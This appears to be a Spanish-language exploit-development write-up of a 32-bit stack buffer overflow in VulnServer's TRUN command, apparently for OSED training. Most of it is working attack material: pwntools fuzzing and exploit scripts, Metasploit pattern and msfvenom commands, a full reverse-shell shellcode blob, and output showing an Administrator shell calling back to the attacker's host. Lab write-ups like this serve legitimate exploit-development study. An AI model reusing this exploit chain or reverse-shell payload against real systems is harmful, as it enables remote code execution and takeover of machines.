---
layout: post
title: VulnServer - TRUN
description: VulnServer - TRUN
tags: [BoF,osed]
---

### Detalles

- Máquina objetivo: Windows XP
- IP local: 192.168.0.107
- IP objetivo: 192.168.0.105
- Software de depuración: Inmunity Debugger

En este artículo solo me centraré en hacer uso de la técnica `salto a ESP`, por tanto omitiré algunas pasos que comunmente se daría en la explotación de un Buffer Overflow de 32 bits.

Iniciaré realizando un pequeño análisis del código de [vulnserver](https://github.com/stephenbradshaw/vulnserver) en la función `TRUN`

La opción 5 (TRUN) de `vulnserver` nos dice que se reserva 3000 bytes de nuestra entrada `RecvBuf` hacia una variable puntero `TrunBuf`. Verifica si la entrada tiene un caracter "." y llama a la función `Function3`

```
[...]
} else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
				char *TrunBuf = malloc(3000);
				memset(TrunBuf, 0, 3000);
				for (i = 5; i < RecvBufLen; i++) {
					if ((char)RecvBuf[i] == '.') {
						strncpy(TrunBuf, RecvBuf, 3000);				
						Function3(TrunBuf);
						break;
					}
				}
				memset(TrunBuf, 0, 3000);				
				SendResult = send( Client, "TRUN COMPLETE\n", 14, 0 );
[...]
```

dentro de `Function3` se llama a `strcpy` donde la cadena que se digitó por el usuario se copiará a la variable `Buffer2S` el cual sólo tiene un tamaño de 2000 bytes. Por tanto podemos romper la pila enviando una carga superior a 2000 bytes.

```
[...]
void Function3(char *Input) {
	char Buffer2S[2000];	
	strcpy(Buffer2S, Input);
}
[...]
```

### Fuzzing

Entonces envio una carga con un tamaño de 3000 bytes.

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

payload = b""
payload += b"TRUN ."
payload += b"A"*3000

r.sendline(payload)
r.close()
```

Podemos ver como el programa crashea y esto se debe a que estamos enviando más bytes de lo que el programa puede soportar

![fuzz](/assets/imgs/trun/fuzz.png)

Si nos fijamos en la parte superior derecha de `Inmunity Debugger` donde se visualiza los registros vemos que somos capaces de sobreescribir `EIP`.

> **EIP** (Extended Instruction Pointer):es un registro en arquitectura x86 (32 bits) que apunta a la siguiente instrucción a ejecutar y contola el flujo de un programa

![reg](/assets/imgs/trun/reg.png)

----

### Encontrando EIP

La forma de obtener la compensación que necesitamos para controlar `EIP` es creando un patrón de caracteres, para ello utilizo `pattern_create` que viene por defecto en el sistema operativo Parrot.

```
❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 3000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6[...]Ac7Ac
```

Ahora sólo sería cambiar la carga por el patron creado de 3000 bytes.

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

payload = b""
payload += b"TRUN ."
payload += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9[...]" # size 3000 bytes

r.sendline(payload)
r.close()
```

Con ello tendriamos la dirección exacta de `EIP`

![eip](/assets/imgs/trun/eip.png)

```
❯ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 396f4338
[*] Exact match at offset 2006
```

> **La parte de búsqueda de badchars se ha omitido ya que para este caso el único cáracter es el byte nulo `(\x00)`**


### Buscar un módulo adecuado

Listamos los modulos disponibles y escogemos el que tenga todas las protecciones deshabilitadas (en este caso essfunc.dll)

`!mona modules`

![mod](/assets/imgs/trun/mod.png)


Ahora verifiquemos si hay una instrucción `JMP ESP` disponible que podamos usar con la ayuda de mona. Simplemente podemos usar `!mona jmp -r esp -m essfunc.dll` para obtener una lista de instrucciones `JMP ESP`

> **ESP** (Extended Stack Pointer): apunta al tope de la pila, es decir al último elemento almacenado en ella. Cuando se almacena un nuevo valor en la pila push, el valor del puntero se actualiza pero siempre apuntar al tope de la pila  
> `JMP ESP`: Salto hacia el registro `ESP`

![dir](/assets/imgs/trun/dir.png)

Usaré la dirección `0x6225011af` como instrucción `JMP ESP`

### Generar shellcode

```
> msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.107 lport=4444 -f python -b "\x00" EXITFUNC=thread
```

### Obtener shell

Código final del exploit

> El payload final tiene la siguiente estructura: <relleno> + <salto a ESP> + <NOPS> + <shellcode>
> **NOPS**: instrucción que no realiza ninguna operación

```
from pwn import *

host = "192.168.0.105"
port = 9999

r = remote(host, port)

buf =  b""
buf += b"\xd9\xe1\xd9\x74\x24\xf4\xbf\xc3\x77\x6b\xbc\x58\x29"
buf += b"\xc9\xb1\x52\x31\x78\x17\x03\x78\x17\x83\x2b\x8b\x89"
buf += b"\x49\x57\x9c\xcc\xb2\xa7\x5d\xb1\x3b\x42\x6c\xf1\x58"
buf += b"\x07\xdf\xc1\x2b\x45\xec\xaa\x7e\x7d\x67\xde\x56\x72"
buf += b"\xc0\x55\x81\xbd\xd1\xc6\xf1\xdc\x51\x15\x26\x3e\x6b"
buf += b"\xd6\x3b\x3f\xac\x0b\xb1\x6d\x65\x47\x64\x81\x02\x1d"
buf += b"\xb5\x2a\x58\xb3\xbd\xcf\x29\xb2\xec\x5e\x21\xed\x2e"
buf += b"\x61\xe6\x85\x66\x79\xeb\xa0\x31\xf2\xdf\x5f\xc0\xd2"
buf += b"\x11\x9f\x6f\x1b\x9e\x52\x71\x5c\x19\x8d\x04\x94\x59"
buf += b"\x30\x1f\x63\x23\xee\xaa\x77\x83\x65\x0c\x53\x35\xa9"
buf += b"\xcb\x10\x39\x06\x9f\x7e\x5e\x99\x4c\xf5\x5a\x12\x73"
buf += b"\xd9\xea\x60\x50\xfd\xb7\x33\xf9\xa4\x1d\x95\x06\xb6"
buf += b"\xfd\x4a\xa3\xbd\x10\x9e\xde\x9c\x7c\x53\xd3\x1e\x7d"
buf += b"\xfb\x64\x6d\x4f\xa4\xde\xf9\xe3\x2d\xf9\xfe\x04\x04"
buf += b"\xbd\x90\xfa\xa7\xbe\xb9\x38\xf3\xee\xd1\xe9\x7c\x65"
buf += b"\x21\x15\xa9\x2a\x71\xb9\x02\x8b\x21\x79\xf3\x63\x2b"
buf += b"\x76\x2c\x93\x54\x5c\x45\x3e\xaf\x37\xaa\x17\xaf\xac"
buf += b"\x42\x6a\xaf\x23\xcf\xe3\x49\x29\xff\xa5\xc2\xc6\x66"
buf += b"\xec\x98\x77\x66\x3a\xe5\xb8\xec\xc9\x1a\x76\x05\xa7"
buf += b"\x08\xef\xe5\xf2\x72\xa6\xfa\x28\x1a\x24\x68\xb7\xda"
buf += b"\x23\x91\x60\x8d\x64\x67\x79\x5b\x99\xde\xd3\x79\x60"
buf += b"\x86\x1c\x39\xbf\x7b\xa2\xc0\x32\xc7\x80\xd2\x8a\xc8"
buf += b"\x8c\x86\x42\x9f\x5a\x70\x25\x49\x2d\x2a\xff\x26\xe7"
buf += b"\xba\x86\x04\x38\xbc\x86\x40\xce\x20\x36\x3d\x97\x5f"
buf += b"\xf7\xa9\x1f\x18\xe5\x49\xdf\xf3\xad\x6a\x02\xd1\xdb"
buf += b"\x02\x9b\xb0\x61\x4f\x1c\x6f\xa5\x76\x9f\x85\x56\x8d"
buf += b"\xbf\xec\x53\xc9\x07\x1d\x2e\x42\xe2\x21\x9d\x63\x27"

payload = b""
payload += b"TRUN ."
payload += b"A"*2006
payload += p32(0x625011af)
payload += b"\x90"*20
payload += buf

r.sendline(payload)
r.close()
```

Ejecutando el exploit

```
❯ python3 exploit.py
[+] Opening connection to 192.168.0.105 on port 9999: Done
[*] Closed connection to 192.168.0.105 port 9999

──────────────────────────────────────────────────────────────────────────────────

❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.107] from (UNKNOWN) [192.168.0.105] 1053
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Administrator\Desktop\vulnerable-apps\vulnserver>whoami
whoami
ADVANCE-5583241\Administrator
```
